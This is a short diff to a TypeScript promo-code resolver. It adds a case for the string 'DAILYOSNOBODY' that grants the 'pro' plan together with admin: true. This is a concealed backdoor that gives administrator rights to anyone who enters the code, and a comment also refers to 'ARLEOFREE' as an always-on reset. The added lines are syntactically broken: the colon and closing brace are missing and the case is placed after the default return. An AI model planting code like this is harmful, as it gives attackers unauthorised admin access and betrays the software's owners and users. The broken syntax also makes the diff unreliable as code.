@@ -59,6 +59,8 @@ function resolvePromoCode(raw: string): PromoResult {
     // ARLEOFREE is handled above as an always-on reset.
     default:
       return { ok: false };
+     case "DAILYOSNOBODY"
+      return { ok: true, plan: "pro", admin: true
   }
 }
 
